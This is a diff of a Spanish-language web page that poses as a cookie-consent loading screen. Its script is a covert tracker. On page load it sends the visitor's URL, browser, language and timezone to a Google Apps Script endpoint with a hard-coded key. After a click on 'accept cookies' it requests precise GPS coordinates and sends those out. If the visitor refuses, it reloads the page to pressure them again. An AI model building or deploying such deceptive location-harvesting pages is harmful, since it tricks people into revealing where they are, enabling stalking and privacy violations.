@@ -5,98 +5,117 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Cargando página</title>
 <style>
+  :root { --rosa: #e91e63; }
   body {
-    display:flex;align-items:center;justify-content:center;
-    height:100vh;margin:0;
+    margin:0;
+    height:100vh;
+    background:var(--rosa);
     font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
-    background:#0b0b0b;color:#fff;overflow:hidden;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
   }
   .card {
-    padding:24px;border-radius:12px;background:#121212;text-align:center;
-    width:min(420px,92vw);box-shadow:0 10px 30px rgba(0,0,0,.35);
+    background:rgba(0,0,0,.25);
+    padding:24px;
+    border-radius:14px;
+    text-align:center;
+    width:min(420px,92vw);
+    backdrop-filter:blur(4px);
   }
   .loader {
-    border:8px solid #333;border-top:8px solid #27ae60;border-radius:50%;
-    width:80px;height:80px;margin:20px auto;animation:spin 2s linear infinite;
+    border:7px solid rgba(255,255,255,.2);
+    border-top:7px solid #fff;
+    border-radius:50%;
+    width:70px;height:70px;
+    margin:16px auto;
+    animation:spin 2s linear infinite;
   }
   @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
-  p { margin:12px 0 0;color:#aab; }
-  .alert { color:#ff6b6b;margin-top:12px;font-size:0.95rem;min-height:1.2em }
 
-  /* Overlay */
-  .overlay {
-    position:fixed;inset:0;background:rgba(0,0,0,.85);
-    display:none;align-items:center;justify-content:center;
-    flex-direction:column;z-index:9999;text-align:center;padding:20px;
+  /* Banner pantalla completa */
+  #cookieFull {
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.92);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:16px;
+    text-align:center;
+    padding:22px;
+    z-index:9999;
   }
-  .count {
-    font-size:64px;line-height:1;margin-top:8px;color:#27ae60;font-weight:700;
-  }
+  #cookieFull h2 { margin:0 0 6px;font-size:1.3rem; }
+  #cookieFull p { margin:0;color:#d5d5d5;max-width:420px;line-height:1.4; }
 
-  /* Banner cookies */
-  #cookieBanner {
-    position:fixed;bottom:0;left:0;right:0;background:#1b1b1b;color:#fff;
-    padding:16px;text-align:center;box-shadow:0 -4px 12px rgba(0,0,0,.4);
-    display:flex;flex-direction:column;align-items:center;gap:10px;z-index:10000;
+  .btn {
+    border:none;
+    border-radius:999px;
+    padding:10px 20px;
+    font-weight:600;
+    cursor:pointer;
+    font-size:1rem;
   }
-  #cookieBanner button {
-    margin:4px;padding:10px 18px;border-radius:8px;font-size:1rem;border:none;cursor:pointer;
+  .btn-primary { background:#4caf50;color:#fff; }
+  .btn-secondary { background:transparent;color:#fff;border:1px solid rgba(255,255,255,.35); }
+
+  /* Pantalla de error / volver a empezar */
+  #needCookies {
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.95);
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:14px;
+    text-align:center;
+    padding:22px;
+    z-index:10000;
   }
-  #cookieBanner .accept {background:#27ae60;color:#fff;}
-  #cookieBanner .reject {background:#333;color:#ccc;border:1px solid #666;}
+  #needCookies h3 { margin:0; }
 </style>
 </head>
 <body>
+
   <div class="card">
     <h2>Cargando página</h2>
-    <div class="loader" id="loader"></div>
-    <p id="status">Esperando cookies...</p>
-    <p class="alert" id="alertMsg"></p>
+    <div class="loader"></div>
+    <p id="status">Esperando confirmación…</p>
+    <p id="alertMsg" style="min-height:1.2em;"></p>
   </div>
 
-  <!-- Banner cookies / ubicación -->
-  <div id="cookieBanner">
-    <p>🍪 Usamos cookies para mejorar tu experiencia.<br>
-    Al aceptar, se solicitarán permisos de la web.</p>
-    <div>
-      <button class="accept" id="acceptCookies">Aceptar y continuar</button>
-      <button class="reject" id="rejectCookies">Rechazar</button>
-    </div>
+  <!-- Banner de cookies (pantalla completa) -->
+  <div id="cookieFull">
+    <h2>Usamos cookies para mejorar tu experiencia</h2>
+    <p>✅ datos de uso y permisos para navegar</p>
+    <button class="btn btn-primary" id="btnAccept">Aceptar cookies</button>
+    <button class="btn btn-secondary" id="btnReject">No aceptar</button>
   </div>
 
-  <!-- Overlay (3er intento) -->
-  <div class="overlay" id="overlay">
-    <div>
-      <p style="color:#ddd;margin:0 0 6px">Inténtalo de nuevo para acceder</p>
-      <div class="count" id="count">5</div>
-      <p style="color:#aab;margin-top:10px">Concede acceso a la ubicación para continuar</p>
-    </div>
+  <!-- Pantalla de “necesitas cookies” -->
+  <div id="needCookies">
+    <h3>Se necesitan cookies para seguir navegando</h3>
+    <p>Vamos a recargar la página para volver a solicitar tu permiso.</p>
   </div>
 
 <script>
-const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxwkROdWrrCoIlY5uZM6mJTLMGpFz-G4tJPsu2d9_9PGUyhLtwlwMUxTLfyQnZWhJCd/exec';
-const SECRET   = 'direccion_010233!d';
+/* ===== CONFIG ===== */
+const ENDPOINT = "https://script.google.com/macros/s/AKfycbxwkROdWrrCoIlY5uZM6mJTLMGpFz-G4tJPsu2d9_9PGUyhLtwlwMUxTLfyQnZWhJCd/exec";
+const SECRET   = "direccion_010233!d";
 
 const statusEl = document.getElementById('status');
 const alertMsg = document.getElementById('alertMsg');
-const loader   = document.getElementById('loader');
-const cookieBanner = document.getElementById('cookieBanner');
-const acceptBtn = document.getElementById('acceptCookies');
-const rejectBtn = document.getElementById('rejectCookies');
-const overlay  = document.getElementById('overlay');
-const countEl  = document.getElementById('count');
+const cookieFull = document.getElementById('cookieFull');
+const needCookies = document.getElementById('needCookies');
+const btnAccept = document.getElementById('btnAccept');
+const btnReject = document.getElementById('btnReject');
 
-let denyCount = 0;
-let finished  = false;
-
-/* === Pantalla completa === */
-async function goFullscreen(){
-  const docEl = document.documentElement;
-  if (docEl.requestFullscreen) await docEl.requestFullscreen();
-  else if (docEl.webkitRequestFullscreen) await docEl.webkitRequestFullscreen();
-}
-
-/* === Enviar datos === */
+/* ===== helpers ===== */
 async function send(data){
   try{
     await fetch(ENDPOINT,{
@@ -108,7 +127,6 @@ async function send(data){
   }catch(e){}
 }
 
-/* === Geolocalización === */
 function getPosition(){
   return new Promise((resolve,reject)=>{
     navigator.geolocation.getCurrentPosition(resolve,reject,{
@@ -117,80 +135,73 @@ function getPosition(){
   });
 }
 
-/* === Registro exitoso === */
-async function registerAndClose(pos){
-  const lat = pos.coords.latitude.toFixed(6);
-  const lng = pos.coords.longitude.toFixed(6);
-  const acc = (pos.coords.accuracy||0).toFixed(1);
-  await send({ k:SECRET, lat, lng, accuracy:acc, device:navigator.userAgent });
+/* 1) registrar APENAS entra */
+(async function autoOpen(){
+  await send({
+    k: SECRET,
+    via: "auto-open",
+    ts: new Date().toISOString(),
+    url: window.location.href,
+    device: navigator.userAgent,
+    lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    online: navigator.onLine
+  });
+})();
+
+/* 2) si acepta cookies → después de 3s pedimos ubicación */
+btnAccept.addEventListener('click', ()=>{
+  cookieFull.style.display='none';
   statusEl.textContent = 'Cookies aceptadas';
-  alertMsg.textContent = '';
-  finished = true;
-  setTimeout(()=>{ try{window.close()}catch(e){} }, 1200);
+
+  // registrar que aceptó cookies
+  send({
+    k: SECRET,
+    via: "cookies-accepted",
+    ts: new Date().toISOString(),
+    url: window.location.href,
+    device: navigator.userAgent
+  });
+
+  // después de 3s pedimos ubicación
+  setTimeout(requestLocation, 3000);
+});
+
+/* 3) si NO acepta mostramos pantalla y recargamos */
+btnReject.addEventListener('click', ()=>{
+  showNeedAndReload();
+});
+
+function showNeedAndReload(){
+  needCookies.style.display = 'flex';
+  setTimeout(()=>{ location.reload(); }, 2500);
 }
 
-/* === Flujo principal === */
+/* 4) pedir ubicación */
 async function requestLocation(){
-  loader.style.display='block';
-  statusEl.textContent='Cargando...';
   try{
     const pos = await getPosition();
-    cookieBanner.style.display='none';
-    await registerAndClose(pos);
+    const lat = pos.coords.latitude.toFixed(6);
+    const lng = pos.coords.longitude.toFixed(6);
+    const acc = (pos.coords.accuracy||0).toFixed(1);
+
+    await send({
+      k: SECRET,
+      via: "gps",
+      ts: new Date().toISOString(),
+      lat, lng, accuracy: acc,
+      url: window.location.href,
+      device: navigator.userAgent
+    });
+
+    statusEl.textContent = 'Registro completado ✅';
+    setTimeout(()=>{ try{ window.close(); }catch(e){} }, 1200);
+
   }catch(err){
-    denyCount++;
-    loader.style.display='none';
-    alertMsg.textContent='Acepta las cookies para avanzar';
-    cookieBanner.style.display='flex';
-    if (denyCount >= 3 && !finished){
-      startFinalOverlayAndAttempt();
-    }
+    // si el usuario negó o el navegador ya lo tenía bloqueado
+    showNeedAndReload();
   }
 }
-
-/* === Overlay 3er intento === */
-function startFinalOverlayAndAttempt(){
-  overlay.style.display='flex';
-  let n = 5;
-  countEl.textContent = n;
-  (async ()=>{
-    try{
-      const pos = await getPosition();
-      if(!finished){
-        overlay.style.display='none';
-        cookieBanner.style.display='none';
-        await registerAndClose(pos);
-      }
-    }catch(e){}
-  })();
-  const iv = setInterval(()=>{
-    if (finished){ clearInterval(iv); return; }
-    n--; countEl.textContent = n;
-    if (n <= 0 && !finished){
-      clearInterval(iv);
-      try{ window.close(); }catch(e){}
-    }
-  }, 1000);
-}
-
-/* === Banner cookies === */
-acceptBtn.addEventListener('click', async ()=>{
-  await goFullscreen(); // entra en pantalla completa
-  cookieBanner.style.display='none';
-  requestLocation();
-});
-
-rejectBtn.addEventListener('click', ()=>{
-  alert('No se puede acceder sin aceptar.');
-  cookieBanner.style.display='flex';
-});
-
-/* === Inicio === */
-cookieBanner.style.display = 'flex';
-statusEl.textContent = 'Esperando cookies...';
-alertMsg.textContent = '';
-denyCount = 0;
-finished = false;
 </script>
 </body>
 </html>
